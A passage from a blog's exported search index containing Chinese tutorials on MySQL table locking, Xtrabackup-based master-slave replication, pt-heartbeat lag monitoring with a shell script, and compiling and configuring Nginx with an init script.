&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行到这里时,进入封闭空间。 table1 仅允许[所有人]读,[空间外]如需写、更新要等待[空间退出],[空间内]如需写、更新会引发mysql报错。 table2 仅允许[空间内]读写更新,[空间外]如需写、更新要等待[空间退出]。 table3 仅允许[所有人]读,[空间外]如需写、更新要等待[空间退出],[空间内]如需写、更新会引发mysql报错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行到这里时,退出封闭空间,释放所有表锁 1unlock tables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当前线程关闭时,自动退出封闭空间,释放所有表锁,无论有没有执行 unlock tables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加锁和解锁（表级锁）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实验中用到的命令： 12mysql&gt; show engines; #提供什么存储引擎:mysql&gt; show variables like '%storage_engine%'; #当前默认的存储引擎:]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 Xtrabackup 在线对MySQL做主从复制]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F35.%20%E4%BD%BF%E7%94%A8%20Xtrabackup%20%E5%9C%A8%E7%BA%BF%E5%AF%B9MySQL%E5%81%9A%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[使用 Xtrabackup 在线对MySQL做主从复制说明xtrabackup&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysqldump对于导出10G以下的数据库或几个表，还是适用的，而且更快捷。一旦数据量达到100-500G，无论是对原库的压力还是导出的性能，mysqldump就力不从心了。Percona-Xtrabackup备份工具，是实现MySQL在线热备工作的不二选择，可进行全量、增量、单表备份和还原。（但当数据量更大时，可能需要考虑分库分表，或使用 LVM 快照来加快备份速度了） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.2版本 xtrabackup 能对InnoDB和XtraDB存储引擎的数据库非阻塞地备份，innobackupex通过perl封装了一层xtrabackup，对MyISAM的备份通过加表读锁的方式实现。2.3版本 xtrabackup 命令直接支持MyISAM引擎。XtraBackup优势 ： 无需停止数据库进行InnoDB热备 增量备份MySQL 流压缩到传输到其它服务器 能比较容易地创建主从同步 备份MySQL时不会增大服务器负载 replication1. 为什么要做主从复制？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我想这是要在实施以前要想清楚的问题。是为了实现读写分离，减轻主库负载或数据分析？ 为了数据安全，做备份恢复？主从切换做高可用？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大部分场景下，以上三个问号一主一从都能够解决，而且任何生产环境都建议你至少要有一个从库，假如你的读操作压力特别大，甚至要做一主多从，还可以不同的slave扮演不同的角色，例如使用不同的索引，或者不同的存储引擎，或使用一个小内存server做slave只用于备份。（当然slave太多也会对master的负载和网络带宽造成压力，此时可以考虑级联复制，即 A-&gt;B-&gt;C ） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有需要考虑的是，一主一从，一旦做了主从切换，不通过其它HA手段干预的话，业务访问的还是原IP，而且原主库很容易就作废了。于是 主-主 复制就产生了，凭借各自不同的 server-id ，可以避免 “A的变化同步到B，B应用变化又同步到A” 这样循环复制的问题。但建议是，主主复制，其中一个主库强制设置为只读，主从切换后架构依然是可用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制过程是slave主动向master拉取，而不是master去推的，所以理想情况下做搭建主从时不需要master做出任何改变甚至停服，slave失败也不影响主库。 复制类型 基于语句的复制：STATEMENT，在主服务器上执行的SQL语句，在从服务器上执行同样的语句，有可能会由于SQL执行上下文环境不同而是数据不一致，例如调用NOW()函数。MySQL在5.7.7以前默认采用基于语句的复制，在 5.7.7 及以后版本默认改用 row-based。 基于行的复制：ROW，把改变的内容复制过去，而不是把命令在从服务器上执行一遍。从mysql5.0开始支持，能够严格保证数据完全一致，但此时用mysqlbinlog去分析日志就没啥意义。因为任何一条update语句，都会把涉及到的行数据全部set值，所以binlog文件会比较大。（遇到的一个坑是，迁移时，从库改正了字段默认值定义，但数据在主库更改后，即使产生的新数据默认值是正确的，但基于行的复制依然用不正确的值字段全部更新了） 混合类型的复制: MIXED，默认采用基于语句的复制，一旦发现基于语句的无法精确的复制时，就会采用基于行的复制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql系统库mysql库里面表的日志记录格式需要说明：在通过如INSERT、UPDATE、DELETE、TRUNCATE等方式直接修改数据的语句，使用binlog_format指定的方式记录，但使用GRANT、ALTER、CREATE、RENAME等改动的mysql库里数据的，会强制使用statement-based方式记录binlog。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在线修改二进制日志类型，如SET SESSION binlog_format=MIXED;，需要SUPER权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制类型还可以分为 异步复制和半同步复制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常没说明指的都是异步，即主库执行完Commit后，在主库写入Binlog日志后即可成功返回客户端，无需等等Binlog日志传送给从库，一旦主库宕机，有可能会丢失日志。而半同步复制，是等待其中一个从库也接收到Binlog事务并成功写入Relay Log之后，才返回Commit操作成功给客户端；如此半同步就保证了事务成功提交后至少有两份日志记录，一份在主库Binlog上，另一份在从库的Relay Log上，从而进一步保证数据完整性；半同步复制很大程度取决于主从网络RTT（往返时延），以插件 semisync_master/semisync_slave 形式存在。 原理 master将改变记录到二进制日志(binary log)中（这些记录叫做二进制日志事件，binary log events）； slave将master的binary log events拷贝到它的中继日志(relay log)； slave重做中继日志中的事件，将改变反映它自己的数据。 该过程的第一部分就是master记录二进制日志。在每个事务更新数据完成之前，master在二进制日志记录这些改变。MySQL将事务串行的写入二进制日志，即使事务中的语句都是交叉执行的。在事件写入二进制日志完成后，master通知存储引擎提交事务。 下一步将master的binary log拷贝到它自己的中继日志。首先，slave开始一个工作线程——I/O线程。I/O线程在master上打开一个普通的连接，请求从指定日志文件的指定位置之后的日志内容，然后开始binlog dump process。Binlog dump process从master的二进制日志中读取事件，如果已经跟上master，它会睡眠并等待master产生新的事件。I/O线程将这些事件写入中继日志。 SQL slave thread（SQL从线程）处理该过程的最后一步。SQL线程从中继日志读取事件，并重放其中的事件而更新slave的数据，使其与master中的数据一致。只要该线程与I/O线程保持一致，中继日志通常会位于OS的缓存中，所以中继日志的开销很小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此外，在master中也有一个工作线程：和其它MySQL的连接一样，slave在master中打开一个连接也会使得master开始一个线程。复制过程有一个很重要的限制——复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;补充: mysql 5.7开始加入了多源复制，这个特性对同时有很多个mysql实例是很有用的，阿里云RDS（迁移）实现了类似的方式。 从MySQL 5.6.2开始，mysql binlog支持checksum校验，并且5.6.6默认启用（CRC32），这对自己模拟实现mysql复制的场景有影响。 下面开始配置主从：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主从版本一致—&gt;主库授权复制帐号—&gt;确保开启binlog及主从server_id唯一—&gt;xtrabackup恢复到从库—&gt;记录xtrabackup_binlog_info中binlog名称及偏移量—&gt;从库change master to —&gt;slave start—&gt;检查两个yes 2. 创建复制账号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在主库上 12mysql&gt; GRANT REPLICATION SLAVE ON *.* TO 'slave_ali'@'192.168.5.%' IDENTIFIED BY 'slave_ali_pass'; mysql&gt; FLUSH PRIVILEGES; 3. 使用Percona-Xtrabackup恢复数据&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里假设比较简单的情况：全量备份，全量恢复，不涉及增量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;赋予备份用户权限： 123mysql&gt; CREATE USER 'bkpuser'@'localhost' IDENTIFIED BY 'bkppass';mysql&gt; GRANT RELOAD, LOCK TABLES, REPLICATION CLIENT,PROCESS,SUPER ON *.* TO 'bkpuser'@'localhost';mysql&gt; FLUSH PRIVILEGES; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;完整的选项使用请执行innobackupex –-help，这里只介绍使用常用的选项进行完整备份及增量备份和还原。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一节是把数据恢复到从库，借此记录一下xtrabackup的使用（用了云之后，备份技能都丢了~）。生产环境你应该是早就有了xtrabackup的备份，做从库时只需要把备份拷过来，解压恢复。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设 MySQL 安装目录在/opt/mysql，my.cnf配置文件/opt/mysql/my.cnf，端口3306，数据目录/opt/mysql_data，sock位于/opt/mysql_data/mysql.sock。备份数据放在/data/backup/mysql/。 全量备份12$ export BKP_PASS="bkppass"$ innobackupex --defaults-file=/opt/mysql/my.cnf --host=localhost --port=3306 --user=bkpuser --password=$&#123;BKP_PASS&#125; /data/backup/mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认会以当天 日期+时间 戳命名备份目录，如 2015-09-16_00-00-02。一般会对它进行tar压缩，由于tar只能单进程，所以往往这个压缩过程会比备份过程耗时2倍还多。拷贝到需要恢复（做从库）的目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果手头有一份未压缩的全备数据，要在另一台恢复，其实还不如直接 rsync 过来，将近400G的数据压缩与解压缩过程特别漫长。 全量恢复&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在恢复的数据库服务器（从库）上： 1234恢复准备$ innobackupex --use-memory=16G --apply-log 2015-09-16_00-00-02确认数据库是关闭的，并且datadir，目录下为空$ innobackupex --defaults-file=/opt/mysql/my.cnf --use-memory=16G --copy-back 2015-09-16_00-00-02 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步是恢复准备，apply-log应用全备时 log sequence number 之后的数据，完了后会输出类似 InnoDB: Last MySQL binlog file position 0 262484673, file name ./mysql-bin.000135 的信息，告诉我们了后面的从库应该从哪个地方开始复制。时间不会很长，但最好用screen之类的软件放到后台执行，以免终端断开，功亏一篑。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二步使用新的my.cnf文件，将完整的mysql数据文件拷贝到datadir下。 4. 做从库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面恢复过程最后一步apply-log完成之后，会得到一个lsn position 和binlog文件名：262484673、mysql-bin.000135。下面开始从库制作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般在copy-back之后需要修改数据文件目录的属性： 1chown -R mysql.mysql /opt/mysql_data my.cnf&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从库的配置文件简单一点可以从主库拷贝过来，但根据需要，要注意以下几处 server-id一定不能与主库相同否则，会出现如下错误： 1Slave: received end packet FROM server, apparent master shutdown 从库一般作为只读库使用，所以为安全起见，设置只读 set global read_only=1;可以在从服务器的 my.cnf 里加入read-only参数来实现这一点，唯一需要注意的一点事read-only仅对没有super权限的用户有效。所以最好核对一下连接从服务器的用户，确保其没有super权限。 关于从库的事件MYSQL Replication 可以很好的达到你的预期：从库的事件不会自己去执行，主库会把event执行的结果直接同步。在statement模式下，复制的是 event BODY 里的SQL，在row模式下是主库事件执行完成后影响的行精确复制。从库 event_scheduler 参数是被忽略的，并且每个event 状态会是 SLAVESIDE_DISABLED ，但CREATE/ALTER EVENT等操作语句是会复制。主从切换后，从库事件状态会变成ENABLE。 参数调整从库是不允许写入的，否则数据就不一致了。从库实例的配置可以不要主库那么高，比如原16G的buffer pool，根据用途，从库可以设到4-8G（当时前提是将来你也不打算把它切换为主库用）。相应的，read_buffer_size，sort_buffer_size, query_cache_size 这些读相关参数可以略微增大。当然我一般都懒得去改。 skip-slave-start主从创建完成后，默认情况下次启动从库，会自动启动复制进程，一般这也正是我们需要的，但在维护阶段时你可能不想从库启动后立即开始复制，--skip-slave-start选项可以帮到你。 log-slave-updates正常情况从库是不需要写回放日志产生的binlog，无形中增加服务器压力。但如果你想要实现级联复制即 A -&gt; B -&gt; C ，B同时是A的从库，也是C的主库，就需要开启 log-bin 和 log-slave-updates 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，建议显示设置 log-bin=mysql-bin 确保主从正常切换。 show variables like ‘log%’ 查看当前值。 关于过滤表见mysql-replica-filter sync_binlogFor the greatest possible durability and consistency in a replication setup using InnoDB with transactions, you should use innodb_flush_log_at_trx_commit=1 and sync_binlog=1 in the master my.cnf file.上面的话同时也意味着性能最低。可以在这埋点，假如出现慢的情况，把两参数调成2。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动从库启动数据库，注意看日志 1/opt/mysql/bin/mysqld_safe --defaults-file=/opt/mysql/my.cnf &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提示：如果你不确定这个库是谁的从库，保守起见加上–skip-slave-start启动，兴许能防止数据不一致。 change master&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在从库上 12345$ mysql -uslave_ali -p'slave_ali_pass' -S /opt/mysql_data/mysql.sockmysql&gt; change master to master_host=MASTER_HOST, master_port=3306, master_user='slave_ali',master_password='slave_ali_pass', master_log_file='mysql-bin.000135', master_log_pos=262484673; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的 master_log_file 和 master_log_pos 即是输出的值，也可以在新的数据目录下xtrabackup_binlog_info找到信息。 123mysql&gt; show slave status\Gmysql&gt; start slave;mysql&gt; show slave status\G 验证同步延迟&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从库执行 show slave status\G &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;节选： 1234567891011Slave_IO_State: Waiting for master to send event Master_Log_File: mysql-bin.000004 Read_Master_Log_Pos: 931 Relay_Log_File: slave1-relay-bin.000056 Relay_Log_Pos: 950Relay_Master_Log_File: mysql-bin.000004 Slave_IO_Running: Yes Slave_SQL_Running: Yes Exec_Master_Log_Pos: 931 Relay_Log_Space: 408Seconds_Behind_Master: 0 Master_Log_File： I/O线程当前正在读取的主服务器二进制日志文件的名称 Read_Master_Log_Pos：本机I/O线程读取主服务器二进制日志位置上面2各值，与在主库执行show master status;看到的值如果基本接近，说明从库IO线程已经赶上了主库的binlog。 Relay_Master_Log_File: 由SQL线程执行的包含多数近期事件的主服务器二进制日志文件的名称 Exec_Master_Log_Pos: SQL线程执行来自master的二进制日志最后一个事件位置与上面的Relay_Master_Log_File一起，同Master_Log_File、Read_Master_Log_Pos比较，能看到SQL线程是否已经赶上从库本地的IO线程。 Slave_IO_Running：I/O线程是否启动并成功连接到主服务器上一般和下面的Slave_IO_Running和Seconds_Behind_Master一起监控主从健康状态 Slave_SQL_Running：SQL线程是否启动 Seconds_Behind_Master: 从属服务器“落后”多少秒 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;官网的解释是：The number of seconds that the slave SQL thread is behind processing the master binary log。但是当 SBM 为 0 时也不代表一定没有延迟，因为可能因为网络慢的缘故，从库的IO线程传输binlog太慢，它的SQL线程应用日志很容易就赶上relay log，但实际主库产生的binlog比传输的快，就会造成为0的假象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时你反复status会发现 Seconds_Behind_Master 的值在0与一个很大的数之间波动，有可能是主库上执行了一个非常大的event，没执行完毕的时候从库SBM显示为0，event执行完成并传输完binlog后，就会显示SBM非常巨大。（我在从机房迁移mysql到阿里云上部分库老出现这种情况，应该跟网络和大event都有关系）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，relay log 中event记录的时间戳是主库上的时间戳，而SQL thread的时间戳是从库上的，如果主库和从库的时间偏差较大，那么这个SBM的意义就基本不存在了。 参考 高性能Mysql主从架构的复制原理及配置详解 How does MySQL Replication really work? XtraBackup不停机不锁表搭建MySQL主从同步实践 MySQL复制原理与配置 许多模糊的内容还是看官网的]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查看mysql主从复制延迟和数据中断]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F34.%20%E6%9F%A5%E7%9C%8Bmysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%BB%B6%E8%BF%9F%E5%92%8C%E6%95%B0%E6%8D%AE%E4%B8%AD%E6%96%AD%2F</url>
    <content type="text"><![CDATA[查看mysql主从复制延迟和数据中断&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看mySQL延迟的方法，查看了多个案例，大家众说纷纭，意见差不多一致。如下也是我参考别人经验做的一些测试，希望能检测到mysql复制延迟、数据中断。 方法一：查看Seconds_Behind_Master&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该参数有如下值： NULL 表示io_thread或sql_thread有一个发生故障，就是说该线程的Running状态时No，而非Yes 0 表示主从复制良好，没有lag存在 正值 表示主从已出现延时，数字越大表示从库落后主库越多 负值 很罕见，是一个BUG，按理说不应该出现 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该方法是使用命令show slave status,通过比较SQL THREAD接受events时间的时间戳与IO THREAD执行事件events时间戳的差值–秒数，来确定slave落后于master多少，如主从时间不同，改时间的计算不受影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;众所周知备库relay-log和主库的bin-log里的内容一样，真正和主库有关两的是io_thread，当主库I/O负载很大或网络阻塞时，io_thread不能及时复制binlog，而sql_thread一直能跟上io_thread的脚步，这时seconds_behind_master的值是0，实际上却不是，这时用该值作为延迟参考则不准。 1change master to master_host='192.168.2.7',master_user='tongbu',master_password='123456',master_log_file='mysql-bin.000008',master_log_pos=291263843; 方法二：使用pt-heartbeat工具&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该工具可以计算出MySQL复制或者是PostgreSQL,它可以更新master或者监控复制。它还可以从f 读取配置。它借助timestmp的比较实现的，首先需要保证主从服务器时间必须要保持一致，通过与相同的一个NTP server同步时钟。它需要在主库上创建一个heartbeat的表，里面的时间戳ts就是当前的时间戳 now()，该结构也会被复制到从库上。表建好以后，会在主库上以后台进程的模式去执行一行更新操作的命令，定期去向表中的插入数据，这 个周期默认为1 秒，同时从库也会在后台执行一个监控命令，与主库保持一致的周期+0.5S（默认0.5S延迟检查）去比较，复制过来记录的ts值与主库上的同一条ts值，差值为0表示无延时，差值越大表示 延时的秒数越多。 使用工具前提： 在主库上建立heartbeat表 1pt-heartbeat -h localhost -D test --create-table --update 更新主库上的heartbeat 1pt-heartbeat -D test --master-server-id=1 --update 在从库上监控复制延迟 1234567891011121314151617pt-heartbeat --user=tongbu --password='123456' -D test --monitor -h 192.168.2.9 --print-master-server-id0.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.01s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 10.00s [ 0.00s, 0.00s, 0.00s ] 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然还有其他一些操作命令： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将主库上的update使用守护进程方式调度 1pt-heartbeat -D test --master-server-id=1 --update --daemonize &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改主库上的更新时间间隔为2s 1pt-heartbeat -D test --update --daemonize --interval=2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改主库上的pt-heartbeat守护进程 1234pt-heartbeat --stopSuccessfully created file /tmp/pt-heartbeat-sentinelrm -rf /tmp/pt-heartbeat-sentinel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;单词查看从库上的延迟情况 12pt-heartbeat --user=tongbu --password='123456' -D test -h 192.168.2.9 --check0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用守护进程监控从库并输出日志 1pt-heartbeat --user=tongbu --password='123456' -h 192.168.2.9 -D test --master-server-id=1 --monitor --print-master-server-id --daemonize --log=/var/log/pt_slave_lag.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下是脚本的方式，只不过使用脚本的方式实现的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#!/bin/sh#description:check slave replication delayPT=`which pt-heartbeat`ADMIN=`which mysqladmin`MYSQL=`which mysql`WARN=10CRITIC=20COMMON=3MASTERID=1###############watch_update()&#123;RE=`ps -ef|grep $PT|grep -v grep|grep "\--update"`if [ ! -n "$RE" ];then $PT -D test --master-server-id=$MASTERID --update --daemonizefi&#125;################watch_mysql()&#123;SAFE_STATUS=`ps -ef|grep -w mysqld_safe|grep -v grep`MYSQLD_STATUS=`ps -ef|grep -w mysqld|grep -v grep`if [ ! -n "$SAFE_STATUS" ];then echo "Mysqld_safe doesn't running,Please check your mysqld_safe status" exit 1fiif [ ! -n "$MYSQLD_STATUS" ];then echo "Mysqld program status --stop,Please check your mysqld status " exit 1fi&#125;####################watch_mysql_slave()&#123;REP_STATUS=`$ADMIN processlist|grep "Binlog Dump"`if [ ! -n "$REP_STATUS" ];then echo "slave process doesn't running,Please check your replication" exit 1fi&#125;#################enter_slave_info()&#123; echo "please enter your slave username:" read NAME if [ -n "$NAME" ];then echo " you enter username is: $NAME" fi echo "please enter your slave user password:" read PASS if [ -n "$PASS" ];then echo "you enter user password is: $PASS" fi echo "please enter your slave hostname or address:" read ADDR if [ -n "$ADDR" ];then echo "you enter slave hostname or address is: $ADDR" fi&#125;##################watch_slave_delay()&#123;# echo "please enter your watch options(1.check 2.monitor)"# read OPTION# if [ $OPTION -eq 1 ];then SLAVE_DELAY=`$PT --user=$NAME --password="$PASS" -h $ADDR -D test --master-server-id=$MASTERID --check --print-master-server-id`# elif [ $OPTION -eq 2 ];then# `$PT --user=$NAME --password="PASS" -h $ADDR -D test --master-server-id=$MASTERID --monitor --print-master-server-id`# else# echo "your enter are error,now EXIT"# exit 1# fiif [ ! -n "$SLAVE_DELAY" ];then echo "Your pt-heartbeat tool must haven't install or you username,password,slave hostname ERROR" exit 1else echo "DELAY TIME: $SLAVE_DELAY"fi &#125;##################################watch_slave_interrupt()&#123; INT_RE=`$MYSQL -s -u $NAME -p"$PASS" -h $ADDR -e 'show slave status\G'|grep "Last_Error:"` if [ -n "$INT_RE" ];then echo "$INT_RE" else echo "INTERUUPT Info: " echo "$INT_RE" fi&#125;########################WATCH()&#123;watch_slave_delaywatch_slave_interrupt&#125;#########################START_WATCH()&#123; watch_mysql watch_mysql_slave watch_update enter_slave_info &#125;##########################LOOP_WATCH()&#123; START_WATCHecho "+++++++++++++ DELAY INFO ++++++++++++++++" while true;do WATCH sleep 30 done&#125;##########################LOOP_WATCH &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本运行结果如下： 1234567891011121314151617181920212223[root@mjx mjx]# ./delay.sh please enter your slave username:tongbuyou enter username is: tongbuplease enter your slave user password:123456you enter user password is: 123456please enter your slave hostname or address:192.168.2.9you enter slave hostname or address is: 192.168.2.9+++++++++++++ DELAY INFO ++++++++++++++++DELAY TIME: 0.36 1Warning: Using a password on the command line interface can be insecure. Last_Error: DELAY TIME: 0.96 1Warning: Using a password on the command line interface can be insecure. Last_Error: DELAY TIME: 0.12 1Warning: Using a password on the command line interface can be insecure. Last_Error: DELAY TIME: 1.91 1Warning: Using a password on the command line interface can be insecure. Last_Error: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是输出结果没法把报错屏蔽掉。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx编译安装]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F1.%20Nginx%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Nginx编译安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx官方网站, 从官方网站可以看到Nginx更新速度很快，这也反映了一个事实，目前使用Nginx跑网站的公司或者个人越来越多。 1.下载 Nginx12cd /usr/local/src/wget http://nginx.org/download/nginx-1.4.4.tar.gz 2.解压 nginx1tar zxvf nginx-1.4.4.tar.gz 3.配置编译参数12345678cd nginx-1.4.4./configure \--prefix=/usr/local/nginx \--with-http_realip_module \--with-http_sub_module \--with-http_gzip_static_module \--with-http_stub_status_module \--with-pcre &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译报错 1234567./configure: error: the HTTP rewrite module requires the PCRE library.```bash&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;解决办法```bashyum -y install pcre-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法 1yum -y install gcc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法 1yum install -y zlib-devel 4.编译、安装 nginx1make &amp;&amp; make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 nginx 比较小，所以很快就会安装完，而且也不会出什么错误。 5.编写 nginx 启动脚本，并加入系统服务1vim /etc/init.d/nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加下内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#!/bin/bash# chkconfig: - 30 21# description: http service.# Source Function Library. /etc/init.d/functions# Nginx SettingsNGINX_SBIN="/usr/local/nginx/sbin/nginx"NGINX_CONF="/usr/local/nginx/conf/nginx.conf"NGINX_PID="/usr/local/nginx/logs/nginx.pid"RETVAL=0prog="Nginx"start() &#123; echo -n $"Starting $prog: " mkdir -p /dev/shm/nginx_temp daemon $NGINX_SBIN -c $NGINX_CONF RETVAL=$? echo return $RETVAL&#125;stop() &#123; echo -n $"Stopping $prog: " killproc -p $NGINX_PID $NGINX_SBIN -TERM rm -rf /dev/shm/nginx_temp RETVAL=$? echo return $RETVAL&#125;reload()&#123; echo -n $"Reloading $prog: " killproc -p $NGINX_PID $NGINX_SBIN -HUP RETVAL=$? echo return $RETVAL&#125;restart()&#123; stop start&#125;configtest()&#123; $NGINX_SBIN -c $NGINX_CONF -t return 0&#125;case "$1" in start) start ;; stop) stop ;; reload) reload ;; restart) restart ;; configtest) configtest ;; *) echo $"Usage: $0 &#123;start|stop|reload|restart|configtest&#125;" RETVAL=1esacexit $RETVAL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，更改权限： 12chmod 755 /etc/init.d/nginxchkconfig --add nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要开机启动，执行： 1chkconfig nginx on 6.更改 nginx 配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先把原来的配置文件清空 1&gt; /usr/local/nginx/conf/nginx.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“&gt;”这个符号为重定向的意思，单独用它，可以把一个文本文档快速清空。 1vim /usr/local/nginx/conf/nginx.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364user nobody nobody;worker_processes 2;error_log /usr/local/nginx/logs/nginx_error.log crit;pid /usr/local/nginx/logs/nginx.pid;worker_rlimit_nofile 51200;events&#123; use epoll; worker_connections 6000;&#125;http&#123; include mime.types; default_type application/octet-stream; server_names_hash_bucket_size 3526; server_names_hash_max_size 4096; log_format combined_realip '$remote_addr $http_x_forwarded_for [$time_local]' '$host "$request_uri" $status' '"$http_referer" "$http_user_agent"'; sendfile on; tcp_nopush on; keepalive_timeout 30; client_header_timeout 3m; client_body_timeout 3m; send_timeout 3m; connection_pool_size 256; client_header_buffer_size 1k; large_client_header_buffers 8 4k; request_pool_size 4k; output_buffers 4 32k; postpone_output 1460; client_max_body_size 10m; client_body_buffer_size 256k; client_body_temp_path /usr/local/nginx/client_body_temp; proxy_temp_path /usr/local/nginx/proxy_temp; fastcgi_temp_path /usr/local/nginx/fastcgi_temp; fastcgi_intercept_errors on; tcp_nodelay on; gzip on; gzip_min_length 1k; gzip_buffers 4 8k; gzip_comp_level 5; gzip_http_version 1.1; gzip_types text/plain application/x-javascript text/css text/htm application/xml;server&#123; listen 80; server_name localhost; index index.html index.htm index.php; root /usr/local/nginx/html; location ~ \.php$ &#123; include fastcgi_params; fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html$fastcgi_script_name; &#125;&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置后，先检验一下配置文件是否有错误存在： 1/usr/local/nginx/sbin/nginx -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果显示内容如下，则配置正确，否则需要根据错误提示修改配置文件： 12345678nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful``` ## 7.启动 nginx```bashservice nginx start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不能启动，查看 